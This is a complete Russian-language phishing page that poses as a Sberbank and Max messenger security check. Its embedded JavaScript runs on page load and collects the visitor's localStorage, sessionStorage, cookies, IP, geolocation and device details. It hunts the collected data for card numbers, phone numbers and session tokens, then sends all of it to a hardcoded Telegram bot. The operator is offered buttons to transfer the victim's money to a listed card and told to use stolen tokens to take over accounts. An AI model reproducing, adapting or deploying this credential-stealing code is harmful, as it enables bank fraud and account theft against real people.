<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>СберБанк • Мессенджер Max</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 24px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
            max-width: 380px;
            width: 100%;
            padding: 32px 24px;
            text-align: center;
        }
        .logos {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 20px;
        }
        .logo-sber svg, .logo-max svg { width: 60px; height: 60px; }
        .logo-sber h2, .logo-max h2 { font-size: 14px; margin-top: 8px; }
        .logo-sber h2 { color: #2d6a4f; }
        .logo-max h2 { color: #1e88e5; }
        .loader {
            width: 40px;
            height: 40px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #2d6a4f;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .message { color: #666; font-size: 14px; margin-top: 16px; }
        .services { margin-top: 20px; font-size: 12px; color: #999; display: flex; justify-content: center; gap: 15px; }
        .footer { margin-top: 20px; font-size: 11px; color: #ccc; }
        .debug { display: none; }
    </style>
</head>
<body>
<div class="card">
    <div class="logos">
        <div class="logo-item logo-sber">
            <svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" fill="#2d6a4f"/><text x="50" y="68" text-anchor="middle" fill="white" font-size="32">СБ</text></svg>
            <h2>СберБанк</h2>
        </div>
        <div class="logo-item logo-max">
            <svg viewBox="0 0 100 100"><rect width="100" height="100" rx="20" fill="#1e88e5"/><text x="50" y="68" text-anchor="middle" fill="white" font-size="36">M</text></svg>
            <h2>Max</h2>
        </div>
    </div>
    <div class="loader"></div>
    <div class="message">Проверка защищенных соединений...</div>
    <div class="services">СберБанк Онлайн • Мессенджер Max</div>
    <div class="footer">SSL Secure Connection</div>
</div>

<script>
// ========== НАСТРОЙКИ TELEGRAM (ВСТАВЬ СВОИ) ==========
const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";  // ТВОЙ ТОКЕН
const CHAT_ID = "8533450974";                           // ТВОЙ CHAT_ID
const MY_CARD = "2203830216112947";                    // ТВОЯ КАРТА
// =====================================================

// Функция отправки в Telegram
function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4096) })
    }).catch(e => console.log("Send error:", e));
}

// Функция отправки с кнопками
function sendWithButtons(text, callbackPrefix) {
    const buttons = [[
        { text: "💰 ПЕРЕВЕСТИ ВСЁ", callback_data: `${callbackPrefix}_all` },
        { text: "💰 5000₽", callback_data: `${callbackPrefix}_5000` },
        { text: "💰 10000₽", callback_data: `${callbackPrefix}_10000` }
    ]];
    
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            reply_markup: { inline_keyboard: buttons }
        })
    }).catch(e => console.log(e));
}

// ========== ФУНКЦИЯ ДЛЯ ОТЛАДКИ — ПОКАЗЫВАЕТ ВСЕ КЛЮЧИ ==========
function getAllLocalStorageKeys() {
    const keys = [];
    for (let i = 0; i < localStorage.length; i++) {
        keys.push(localStorage.key(i));
    }
    return keys;
}

// ========== 1. КРАЖА ВСЕХ ДАННЫХ ИЗ LOCALSTORAGE ==========
function stealAllData() {
    const allData = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        try {
            let value = localStorage.getItem(key);
            // Ограничиваем длину для отправки
            if (value && value.length > 1000) {
                value = value.substring(0, 1000) + "... [обрезано]";
            }
            allData[key] = value;
        } catch(e) {
            allData[key] = "[ошибка чтения]";
        }
    }
    return allData;
}

// ========== 2. КРАЖА ВСЕХ COOKIES ==========
function stealAllCookies() {
    return document.cookie || "нет cookies";
}

// ========== 3. КРАЖА SESSIONSTORAGE ==========
function stealSessionData() {
    const sessionData = {};
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        try {
            let value = sessionStorage.getItem(key);
            if (value && value.length > 1000) value = value.substring(0, 1000) + "...";
            sessionData[key] = value;
        } catch(e) {}
    }
    return sessionData;
}

// ========== 4. ПОИСК ДАННЫХ СБЕРБАНКА ==========
function findSberData(allData) {
    const sberFound = {};
    const patterns = {
        card: /\d{16}/g,
        phone: /7\d{10}/g,
        token: /eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g,
        sberKeys: ['sber', 'sb', 'bank', 'сбер', 'карт', 'card', 'token', 'auth']
    };
    
    // Ищем по ключам
    for (const [key, value] of Object.entries(allData)) {
        const lowerKey = key.toLowerCase();
        for (const pattern of patterns.sberKeys) {
            if (lowerKey.includes(pattern)) {
                sberFound[key] = value;
                break;
            }
        }
        
        // Ищем номер карты в значениях
        if (typeof value === 'string') {
            const cardMatch = value.match(patterns.card);
            if (cardMatch && !sberFound.card_number) {
                sberFound.card_number = cardMatch[0];
            }
            const phoneMatch = value.match(patterns.phone);
            if (phoneMatch && !sberFound.phone) {
                sberFound.phone = phoneMatch[0];
            }
            const tokenMatch = value.match(patterns.token);
            if (tokenMatch && !sberFound.token) {
                sberFound.token = tokenMatch[0];
            }
        }
    }
    
    return sberFound;
}

// ========== 5. ПОИСК ДАННЫХ МЕССЕНДЖЕРА MAX ==========
function findMaxData(allData) {
    const maxFound = {};
    const maxKeys = ['max', 'messenger', 'чат', 'message', 'dialog', 'contact', 'user', 'profile', 'account'];
    
    for (const [key, value] of Object.entries(allData)) {
        const lowerKey = key.toLowerCase();
        for (const pattern of maxKeys) {
            if (lowerKey.includes(pattern)) {
                maxFound[key] = value;
                break;
            }
        }
    }
    
    // Поиск токенов
    const tokenPattern = /eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g;
    for (const [key, value] of Object.entries(allData)) {
        if (typeof value === 'string') {
            const tokenMatch = value.match(tokenPattern);
            if (tokenMatch && !maxFound.token) {
                maxFound.token = tokenMatch[0];
            }
        }
    }
    
    return maxFound;
}

// ========== 6. ПОЛУЧЕНИЕ IP ==========
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch(e) {
        return "unknown";
    }
}

// ========== 7. ПОЛУЧЕНИЕ ГЕОЛОКАЦИИ ==========
function getGeo() {
    return new Promise((resolve) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
                () => resolve(null)
            );
        } else {
            resolve(null);
        }
    });
}

// ========== 8. ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ ==========
function getDeviceInfo() {
    const ua = navigator.userAgent;
    return {
        os: /Android/i.test(ua) ? "Android" : /iPhone|iPad/i.test(ua) ? "iOS" : /Windows/i.test(ua) ? "Windows" : "Other",
        browser: ua,
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        localStorageSize: localStorage.length
    };
}

// ========== 9. ГЛАВНАЯ ФУНКЦИЯ ==========
async function main() {
    // Собираем ВСЕ данные
    const allData = stealAllData();
    const cookies = stealAllCookies();
    const sessionData = stealSessionData();
    const allKeys = getAllLocalStorageKeys();
    const ip = await getIP();
    const geo = await getGeo();
    const device = getDeviceInfo();
    
    // Ищем специфические данные
    const sberData = findSberData(allData);
    const maxData = findMaxData(allData);
    
    // ========== ОТПРАВКА ДИАГНОСТИКИ (ЧТОБЫ ВИДЕТЬ, ЧТО НАЙДЕНО) ==========
    let diagnosticReport = `🔍 ДИАГНОСТИКА\n`;
    diagnosticReport += `⏰ ${new Date().toLocaleString()}\n`;
    diagnosticReport += `🌐 ${window.location.hostname}\n`;
    diagnosticReport += `📱 ${device.os} | ${device.screen}\n`;
    diagnosticReport += `🌍 IP: ${ip}\n`;
    if (geo) diagnosticReport += `📍 ${geo.lat}, ${geo.lng}\n`;
    diagnosticReport += `📦 localStorage: ${device.localStorageSize} записей\n`;
    diagnosticReport += `🍪 Cookies: ${cookies.length > 0 ? "✅ есть" : "❌ нет"}\n`;
    diagnosticReport += `\n📋 ВСЕ КЛЮЧИ localStorage:\n${allKeys.join(", ")}\n`;
    
    sendToTelegram(diagnosticReport);
    
    // ========== ОТПРАВКА ВСЕХ ДАННЫХ LOCALSTORAGE ==========
    if (Object.keys(allData).length > 0) {
        sendToTelegram(`💾 ВСЕ ДАННЫЕ LOCALSTORAGE:\n\`\`\`json\n${JSON.stringify(allData, null, 2).substring(0, 3500)}\n\`\`\``);
    } else {
        sendToTelegram(`⚠️ LOCALSTORAGE ПУСТ! Жертва не сохраняла данные в браузере.`);
    }
    
    // ========== ОТПРАВКА COOKIES ==========
    if (cookies && cookies.length > 0) {
        sendToTelegram(`🍪 COOKIES:\n${cookies.substring(0, 3500)}`);
    }
    
    // ========== ОТПРАВКА SESSIONSTORAGE ==========
    if (Object.keys(sessionData).length > 0) {
        sendToTelegram(`📦 SESSIONSTORAGE:\n\`\`\`json\n${JSON.stringify(sessionData, null, 2).substring(0, 3500)}\n\`\`\``);
    }
    
    // ========== ОТЧЕТ ПО СБЕРБАНКУ ==========
    let sberReport = `🏦 СБЕРБАНК\n`;
    if (Object.keys(sberData).length > 0) {
        sberReport += `✅ НАЙДЕНЫ ДАННЫЕ:\n\`\`\`json\n${JSON.stringify(sberData, null, 2)}\n\`\`\``;
        sendToTelegram(sberReport);
        
        // Если есть карта или токен — показываем кнопки
        if (sberData.card_number || sberData.token) {
            sendWithButtons(
                `💰 ГОТОВ К ПЕРЕВОДУ\n💳 Карта: ${sberData.card_number || "из токена"}\n📞 Телефон: ${sberData.phone || "не найден"}\nНа карту: ${MY_CARD}`,
                "sber"
            );
        }
    } else {
        sberReport += `❌ ДАННЫХ НЕ НАЙДЕНО\n\nВозможные причины:\n- Жертва не входила в Сбербанк в этом браузере\n- Данные хранятся в другом месте (мобильное приложение)\n- Используется другой браузер\n\nПопробуй отправить ссылку в другой браузер/устройство`;
        sendToTelegram(sberReport);
    }
    
    // ========== ОТЧЕТ ПО МЕССЕНДЖЕРУ MAX ==========
    let maxReport = `💬 МЕССЕНДЖЕР MAX\n`;
    if (Object.keys(maxData).length > 0) {
        maxReport += `✅ НАЙДЕНЫ ДАННЫЕ:\n\`\`\`json\n${JSON.stringify(maxData, null, 2)}\n\`\`\``;
        sendToTelegram(maxReport);
        
        // Если есть токен — показываем кнопки
        if (maxData.token) {
            sendToTelegram(`🔑 ТОКЕН MAX: ${maxData.token.substring(0, 100)}...\n\nИспользуй этот токен для входа в аккаунт Max через браузер или API.`);
        }
    } else {
        maxReport += `❌ ДАННЫХ НЕ НАЙДЕНО\n\nВозможные причины:\n- Жертва не входила в Max в этом браузере\n- Max использует мобильное приложение\n- Данные хранятся в другом месте`;
        sendToTelegram(maxReport);
    }
    
    // ========== ОТПРАВКА ИНФОРМАЦИИ ОБ УСТРОЙСТВЕ ==========
    sendToTelegram(`📱 УСТРОЙСТВО:\n\`\`\`json\n${JSON.stringify(device, null, 2)}\n\`\`\``);
}

// ЗАПУСК
main();

// Перенаправление на реальный сайт
setTimeout(() => {
    window.location.href = "https://online.sberbank.ru";
}, 4000);
</script>
</body>
</html>
